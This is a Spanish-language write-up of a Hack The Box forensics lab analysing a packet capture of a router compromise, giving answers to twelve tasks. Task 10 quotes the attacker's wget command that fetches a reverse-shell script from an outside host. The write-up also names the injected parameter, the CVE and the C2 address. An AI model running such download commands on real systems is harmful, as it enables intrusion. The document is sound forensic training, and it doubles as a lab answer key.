@@ -1,0 +1,99 @@
+# Hack The Box - Trent (Forensics)  
+**Archivo analizado:** `trent.pcap`  
+**Herramientas usadas:** Wireshark, NetworkMiner, navegador web  
+
+---
+
+## 🕵️‍♂️ Análisis de las Tareas
+
+### ✅ Task 1
+**Pregunta:** From what IP address did the attacker initially launched their activity?  
+**Respuesta:** `192.168.10.2`  
+**Método:** Se identificó la primera IP que inició tráfico HTTP hacia el router (`192.168.10.1`) usando Wireshark. Se filtraron las peticiones `POST` relacionadas con el portal de administración para detectar el inicio de la actividad maliciosa.
+
+---
+
+### ✅ Task 2
+**Pregunta:** What is the model name of the compromised router?  
+**Respuesta:** `TEW-827DRU`  
+**Método:** Extraído del contenido HTML (`adm_status.asp`) o desde cabeceras HTTP analizadas con NetworkMiner o Wireshark.
+
+---
+
+### ✅ Task 3
+**Pregunta:** How many failed login attempts did the attacker try before successfully logging into the router?  
+**Respuesta:** `2`  
+**Método:** Se contaron dos intentos fallidos de inicio de sesión (`POST`) antes del login exitoso. Es importante revisar los estados de respuesta HTTP para determinar si el servicio aceptó o rechazó las credenciales en cada intento.
+
+---
+
+### ✅ Task 4
+**Pregunta:** At what UTC time did the attacker successfully log into the router’s web admin interface?  
+**Respuesta:** `2024-05-01 15:53:27`  
+**Método:** Se identificó el `POST` exitoso en Wireshark. Al hacer doble clic en el paquete correspondiente se puede ver la hora exacta (en UTC) del inicio de sesión.
+
+---
+
+### ✅ Task 5
+**Pregunta:** How many characters long was the password used to log in successfully?  
+**Respuesta:** `0`  
+**Método:** Desde el mismo paquete observado en la pregunta anterior, se accede al contenido del `POST` y se verifica que el campo `log_pass` está vacío. Esto confirma que no se utilizó ninguna contraseña.
+
+---
+
+### ✅ Task 6
+**Pregunta:** What is the current firmware version installed on the compromised router?  
+**Respuesta:** `2.10`  
+**Método:** Visible en el archivo HTML `adm_status.asp` que puede ser recuperado desde Wireshark o extraído más fácilmente con NetworkMiner.
+
+---
+
+### ✅ Task 7
+**Pregunta:** Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?  
+**Respuesta:** `usbapps.config.smb_admin_name`  
+**Método:** Se detectó manipulación del parámetro en un `POST` con código malicioso inyectado para lograr ejecución remota de comandos.
+
+---
+
+### ✅ Task 8
+**Pregunta:** What is the CVE number associated with the vulnerability that was exploited in this attack?  
+**Respuesta:** `CVE-2024-28353`  
+**Método:** Identificado a partir del modelo del router, versión del firmware y la técnica de explotación utilizada (RCE vía parámetros HTTP).
+
+---
+
+### ✅ Task 9
+**Pregunta:** What was the first command the attacker executed by exploiting the vulnerability?  
+**Respuesta:** `whoami`  
+**Método:** Observado como el primer payload enviado tras lograr la ejecución remota mediante inyección en el parámetro vulnerable.
+
+---
+
+### ✅ Task 10
+**Pregunta:** What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?  
+**Respuesta:** `wget http://35.159.25.253:8000/a1l4m.sh`  
+**Método:** El comando fue enviado como parte del payload en el `POST` al router para descargar el script malicioso desde un servidor externo.
+
+---
+
+### ✅ Task 11
+**Pregunta:** What response message did the server return after the actor made a typo in the injection?  
+**Respuesta:** `Access to this resource is forbidden`  
+**Método:** Al inspeccionar los `POST` fallidos con errores de sintaxis, se identificó una respuesta HTTP con ese mensaje, indicando denegación de acceso por parte del servidor.
+
+---
+
+### ✅ Task 12
+**Pregunta:** What was the IP address and port number of the C2 server? (IP:Port)  
+**Respuesta:** `35.159.25.253:41143`  
+**Método:** Se encontró al revisar la IP destino y el puerto utilizados en la conexión reverse shell, visibles en el script `a1l4m.sh` descargado por el atacante o directamente en los paquetes de red.
+
+---
+
+## 🧰 Herramientas recomendadas
+- **Wireshark**: para filtrar y analizar tráfico `http.request.method == "POST"` o contenido con palabras clave como `login`.
+- **NetworkMiner**: para extraer archivos HTML y reconstruir sesiones HTTP.
+- **Navegador web**: para visualizar archivos HTML como `adm_status.asp` y obtener información sobre el modelo del router o versión de firmware.
+
+---
+
